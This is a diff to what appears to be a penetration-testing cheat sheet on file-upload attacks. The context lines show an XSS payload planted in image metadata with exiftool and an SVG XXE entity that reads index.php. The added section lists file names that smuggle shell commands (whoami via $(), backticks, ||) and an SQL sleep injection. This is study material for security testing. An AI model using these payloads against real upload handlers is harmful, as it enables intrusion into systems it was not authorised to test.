@@ -52,3 +52,10 @@ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <svg>&xxe;</svg>
 ```
+## Injections in File Name
+```bash
+file$(whoami).jpg
+file`whoami`.jpg
+File.jpg||whoami
+file';select+sleep(5);--.jpg
+```
